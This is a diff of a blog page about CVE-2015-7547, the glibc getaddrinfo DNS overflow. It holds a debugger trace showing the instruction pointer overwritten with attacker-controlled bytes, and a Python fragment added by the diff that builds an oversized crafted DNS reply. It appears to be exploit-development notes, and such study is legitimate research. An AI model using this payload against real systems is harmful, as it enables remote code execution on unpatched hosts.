@@ -202,10 +202,10 @@
 </nav>
       <div class="body-wrap">
   
-    <article id="post-cve-2015-7547" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-CVE-2015-7547" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2016/03/29/cve-2015-7547/" class="article-date">
+      <a href="/2016/03/29/CVE-2015-7547/" class="article-date">
   	<time datetime="2016-03-29T13:03:18.000Z" itemprop="datePublished">2016-03-29</time>
 </a>
     </div>
@@ -219,7 +219,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2016/03/29/cve-2015-7547/">cve-2015-7547</a>
+      <a class="article-title" href="/2016/03/29/CVE-2015-7547/">CVE-2015-7547</a>
     </h1>
   
 
@@ -228,17 +228,25 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>=&gt; 0x8048573 <main+72>:    call   0x8048420 <a href="&#109;&#x61;&#x69;&#108;&#116;&#x6f;&#x3a;&#103;&#x65;&#x74;&#x61;&#100;&#x64;&#114;&#105;&#110;&#x66;&#111;&#x40;&#112;&#108;&#x74;">&#103;&#x65;&#x74;&#x61;&#100;&#x64;&#114;&#105;&#110;&#x66;&#111;&#x40;&#112;&#108;&#x74;</a><br>=&gt; 0xb7ed9c40 <__gi_getaddrinfo>:    push   ebp<br>Breakpoint 1, __GI_getaddrinfo (name=0x8048643 “bigtang.org”,<br>    service=0x8048640 “22”, hints=0xbffff04c, pai=0xbffff044)<br>    at ../sysdeps/posix/getaddrinfo.c:2323</__gi_getaddrinfo></main+72></p>
+        <p>=&gt; 0x8048573 <main+72>:    call   0x8048420 <a href="&#x6d;&#x61;&#105;&#108;&#116;&#111;&#x3a;&#103;&#x65;&#116;&#x61;&#100;&#100;&#114;&#x69;&#x6e;&#x66;&#x6f;&#64;&#x70;&#108;&#116;">&#103;&#x65;&#116;&#x61;&#100;&#100;&#114;&#x69;&#x6e;&#x66;&#x6f;&#64;&#x70;&#108;&#116;</a><br>=&gt; 0xb7ed9c40 <__gi_getaddrinfo>:    push   ebp<br>Breakpoint 1, __GI_getaddrinfo (name=0x8048643 “bigtang.org”,<br>    service=0x8048640 “22”, hints=0xbffff04c, pai=0xbffff044)<br>    at ../sysdeps/posix/getaddrinfo.c:2323</__gi_getaddrinfo></main+72></p>
 <p>=&gt; 0xb7ed9d23 <__gi_getaddrinfo+227>:    call   0xb7ed7470 <gaih_inet><br>=&gt; 0xb7ed7470 <gaih_inet>:    push   ebp<br>Breakpoint 2, gaih_inet (name=0x8048643 “bigtang.org”, service=0xbfffef80,<br>    req=0xbffff04c, pai=0xbfffef70, naddrs=0xbfffef7c)<br>    at ../sysdeps/posix/getaddrinfo.c:275</gaih_inet></gaih_inet></__gi_getaddrinfo+227></p>
 <p>=&gt; 0xb7ed80c7 <gaih_inet+3159>:    call   edi<br>=&gt; 0xb7def4d0 <_nss_dns_gethostbyname4_r>:    push   ebp<br>_nss_dns_gethostbyname4_r (name=0x8048643 “bigtang.org”, pat=0xbfffeecc,<br>    buffer=0xbfffe9e0 “\377\002”, buflen=0x420, errnop=0xbfffeed0,<br>    herrnop=0xbfffeedc, ttlp=0x0) at nss_dns/dns-host.c:284</_nss_dns_gethostbyname4_r></gaih_inet+3159></p>
-<p>=&gt; 0xb7def58b <_nss_dns_gethostbyname4_r+187>:    call   0xb7dedb70 <a href="&#109;&#x61;&#105;&#108;&#116;&#111;&#x3a;&#x5f;&#x5f;&#108;&#105;&#98;&#x63;&#95;&#x72;&#101;&#115;&#x5f;&#x6e;&#x73;&#x65;&#97;&#114;&#99;&#104;&#x40;&#x70;&#x6c;&#x74;">&#x5f;&#x5f;&#108;&#105;&#98;&#x63;&#95;&#x72;&#101;&#115;&#x5f;&#x6e;&#x73;&#x65;&#97;&#114;&#99;&#104;&#x40;&#x70;&#x6c;&#x74;</a><br>=&gt; 0xb7ddb240 <__gi___libc_res_nsearch>:    push   ebp<br><strong>GI_</strong>libc_res_nsearch (statp=0xb7fc1340 <_res>, name=0x8048643 “bigtang.org”,<br>    class=0x1, type=0xf371,<br>    answer=0xbfffe150 “\207C\371VcX\276\070\363\004\016”, anslen=0x800,<br>    answerp=0xbfffe97c, answerp2=0xbfffe980, nanswerp2=0xbfffe984,<br>    resplen2=0xbfffe988, answerp2_malloced=0xbfffe98c) at res_query.c:342</_res></__gi___libc_res_nsearch></_nss_dns_gethostbyname4_r+187></p>
+<p>=&gt; 0xb7def58b <_nss_dns_gethostbyname4_r+187>:    call   0xb7dedb70 <a href="&#x6d;&#97;&#105;&#x6c;&#116;&#x6f;&#58;&#95;&#x5f;&#x6c;&#105;&#x62;&#99;&#x5f;&#114;&#101;&#115;&#x5f;&#x6e;&#115;&#101;&#97;&#x72;&#99;&#x68;&#x40;&#x70;&#108;&#116;">&#95;&#x5f;&#x6c;&#105;&#x62;&#99;&#x5f;&#114;&#101;&#115;&#x5f;&#x6e;&#115;&#101;&#97;&#x72;&#99;&#x68;&#x40;&#x70;&#108;&#116;</a><br>=&gt; 0xb7ddb240 <__gi___libc_res_nsearch>:    push   ebp<br><strong>GI_</strong>libc_res_nsearch (statp=0xb7fc1340 <_res>, name=0x8048643 “bigtang.org”,<br>    class=0x1, type=0xf371,<br>    answer=0xbfffe150 “\207C\371VcX\276\070\363\004\016”, anslen=0x800,<br>    answerp=0xbfffe97c, answerp2=0xbfffe980, nanswerp2=0xbfffe984,<br>    resplen2=0xbfffe988, answerp2_malloced=0xbfffe98c) at res_query.c:342</_res></__gi___libc_res_nsearch></_nss_dns_gethostbyname4_r+187></p>
 <p>=&gt; 0xb7ddb4c6 <__gi___libc_res_nsearch+646>:<br>    call   0xb7ddaeb0 <__libc_res_nquerydomain><br>=&gt; 0xb7ddaeb0 <__libc_res_nquerydomain>:    push   ebp<br>__libc_res_nquerydomain (statp=statp@entry=0xb7fc1340 <_res>,<br>    name=name@entry=0x8048643 “bigtang.org”, domain=0x0, class=0x1,<br>    type=0xf371, answer=0xbfffe150 “\207C\371VcX\276\070\363\004\016”,<br>    anslen=0x800, answerp=0xbfffe97c, answerp2=0xbfffe980,<br>    nanswerp2=0xbfffe984, resplen2=0xbfffe988, answerp2_malloced=0xbfffe98c)<br>    at res_query.c:563</_res></__libc_res_nquerydomain></__libc_res_nquerydomain></__gi___libc_res_nsearch+646></p>
 <p>=&gt; 0xb7ddaf9c <__libc_res_nquerydomain+236>:<br>    call   0xb7dda7f0 <__gi___libc_res_nquery><br>=&gt; 0xb7dda7f0 <__gi___libc_res_nquery>:    push   ebp<br><strong>GI_</strong>libc_res_nquery (statp=0xb7fc1340 <_res>, name=0x8048643 “bigtang.org”,<br>    class=0x1, type=0xf371,<br>    answer=0xbfffe150 “\207C\371VcX\276\070\363\004\016”, anslen=0x800,<br>    answerp=0xbfffe97c, answerp2=0xbfffe980, nanswerp2=0xbfffe984,<br>    resplen2=0xbfffe988, answerp2_malloced=0xbfffe98c) at res_query.c:124<br>124    in res_query.c</_res></__gi___libc_res_nquery></__gi___libc_res_nquery></__libc_res_nquerydomain+236></p>
 <p>=&gt; 0xb7dda969 <__gi___libc_res_nquery+377>:    movzx  ecx,BYTE PTR [edi+0x3]<br>EAX: 0xbfffe980 (‘B’ <repeats 200="" times="">…)<br>EBX: 0xb7dea000 –&gt; 0x14ed4<br>ECX: 0xbfffe980 (‘B’ <repeats 200="" times="">…)<br>EDX: 0x42424242 (‘BBBB’)<br>ESI: 0xb7fc1340 –&gt; 0x5<br>EDI: 0x42424242 (‘BBBB’)<br>EBP: 0xbfffd7f8 –&gt; 0x0<br>ESP: 0xbfffd550 –&gt; 0x16b04<br>EIP: 0xb7dda969 (<__gi___libc_res_nquery+377>:    movzx  ecx,BYTE PTR [edi+0x3])</__gi___libc_res_nquery+377></repeats></repeats></__gi___libc_res_nquery+377></p>
 <p>EAX: 0xbfffe980 (“fA;5A;”…)<br>EBX: 0xb7dea000 –&gt; 0x14ed4<br>ECX: 0xbfffe980 (“fA;5A;”…)<br>EDX: 0x353b4166 (‘fA;5’)<br>ESI: 0xb7fc1340 –&gt; 0x5<br>EDI: 0x3b414a3b (‘;JA;’)<br>EBP: 0xbfffd7f8 –&gt; 0x0<br>ESP: 0xbfffd550 –&gt; 0x11035<br>EIP: 0xb7dda969 (<__gi___libc_res_nquery+377>:    movzx  ecx,BYTE PTR [edi+0x3])</__gi___libc_res_nquery+377></p>
 <p>0x353b4166  2090 0x3b414a3b  2094</p>
 <p>EAX: 0x0<br>EBX: 0x42424242 (‘BBBB’)<br>ECX: 0xb7fbe858 –&gt; 0x804b000 –&gt; 0x0<br>EDX: 0x0<br>ESI: 0x42424242 (‘BBBB’)<br>EDI: 0x42424242 (‘BBBB’)<br>EBP: 0x42424242 (‘BBBB’)<br>ESP: 0xbfffe9c0 –&gt; 0x8044242<br>EIP: 0x42424242 (‘BBBB’)<br>EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)<br>[————————————-code————————————-]<br>Invalid $PC address: 0x42424242<br>[————————————stack————————————-]<br>0000| 0xbfffe9c0 –&gt; 0x8044242<br>0004| 0xbfffe9c4 –&gt; 0xbfffeecc –&gt; 0xbfffee10 –&gt; 0x0<br>0008| 0xbfffe9c8 –&gt; 0xbfffe9e0 –&gt; 0x2ff<br>0012| 0xbfffe9cc –&gt; 0x420<br>0016| 0xbfffe9d0 –&gt; 0xbfffeed0 –&gt; 0xb (‘\x0b’)<br>0020| 0xbfffe9d4 –&gt; 0xbfffeedc –&gt; 0x2<br>0024| 0xbfffe9d8 –&gt; 0x0<br>0028| 0xbfffe9dc –&gt; 0x0<br>[——————————————————————————]<br>Legend: code, data, rodata, value<br>Stopped reason: SIGSEGV<br>0x42424242 in ?? ()</p>
-
+<p>   if data2:<br>      data = ‘’<br>      data += dw(id2)</p>
+<pre><code>#data += &apos;\x00&apos; * (2300)
+data += &apos;A&apos;*38
+data += dd(0)+dd(0x31000000)
+data += &apos;A&apos;*(2090-46)
+data += dd(0x08b00408)+dd(0x38b00408)
+data += &apos;B&apos;*62
+data2_reply = dw(len(data)) + data
+</code></pre>
       
     </div>
     
